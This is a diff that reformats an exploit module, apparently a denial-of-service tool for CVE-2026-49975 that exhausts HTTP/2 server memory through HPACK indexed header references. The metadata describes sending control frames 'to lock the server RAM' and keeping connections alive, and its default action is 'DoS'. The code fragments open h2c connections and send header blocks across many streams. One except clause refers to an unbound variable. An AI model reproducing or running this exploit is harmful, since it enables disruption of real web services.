@@ -27,9 +27,20 @@ the allocated memory from being released.
     "Date": "2026-06-19",
     "Action": [
         ["HTTP/2 Upgrade", {"Description": "Opening a TCP connection (raw socket)"}],
-        ["HPACK Table", {"Description": "Create a HEADERS frame for the HPACK compression payload"}],
-        ["Indexed References", {"Description": "Sending index reference (Indexed Header Field representation)"}],
-        ["Window Stall", {"Description": "Sends a control frame to lock the server RAM."}],
+        [
+            "HPACK Table",
+            {"Description": "Create a HEADERS frame for the HPACK compression payload"},
+        ],
+        [
+            "Indexed References",
+            {
+                "Description": "Sending index reference (Indexed Header Field representation)"
+            },
+        ],
+        [
+            "Window Stall",
+            {"Description": "Sends a control frame to lock the server RAM."},
+        ],
         ["Anti-Timeout", {"Description": "Keep TCP connections from dropping"}],
     ],
     "DefaultAction": "DoS",
@@ -43,9 +54,9 @@ the allocated memory from being released.
             "https://nvd.nist.gov/vuln/detail/CVE-2026-49975",
             "https://www.cve.org/CVERecord?id=CVE-2026-49975",
             "https://access.redhat.com/security/cve/cve-2026-49975",
-            "https://github.com/EQSTLab/CVE-2026-49975"
+            "https://github.com/EQSTLab/CVE-2026-49975",
         ],
-    }
+    },
 }
 
 # OPTIONS MODULES
@@ -310,7 +321,10 @@ def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
     try:
         sock = connect_h2c(args.host, args.port, args.initial_window)
     except OSError as e:
-        smf.printf(f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}connect_failed={CC.RESET}{e}", flush=True)
+        smf.printf(
+            f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}connect_failed={CC.RESET}{e}",
+            flush=True,
+        )
         return
 
     stream_ids = [1 + 2 * i for i in range(args.streams)]
@@ -323,7 +337,10 @@ def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
             frames += send_header_block(sock, stream_id, block)
 
     except OSError as e:
-        print(f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}send_failed={CC.RESET}{e}", flush=True)
+        print(
+            f"{CC.RED}conn={CC.RESET}{conn_id} {CC.RED}send_failed={CC.RESET}{e}",
+            flush=True,
+        )
         try:
             sock.close()
         except OSError as e:
@@ -370,13 +387,15 @@ def run_connection(conn_id: int, args: Namespace, block: bytes) -> None:
         else:
             break
 
-    smf.printf(f"{CC.YELLOW}conn={CC.RESET}{conn_id} {CC.YELLOW}peer_frames={CC.RESET}{counts}", flush=True)
+    smf.printf(
+        f"{CC.YELLOW}conn={CC.RESET}{conn_id} {CC.YELLOW}peer_frames={CC.RESET}{counts}",
+        flush=True,
+    )
 
     try:
         sock.close()
     except OSError:
         smf.printd("CONNECTION FAILED", e, level="ERROR")
-        pass
 
 
 def execute(options):
@@ -399,7 +418,7 @@ def execute(options):
     drip_interval = DEFAULT_DRIP_INTERVAL
     drip_bytes = DEFAULT_DRIP_BYTES
     window = INITIAL_WINDOW
-    
+
     conn = Namespace(
         host=host,
         port=port,
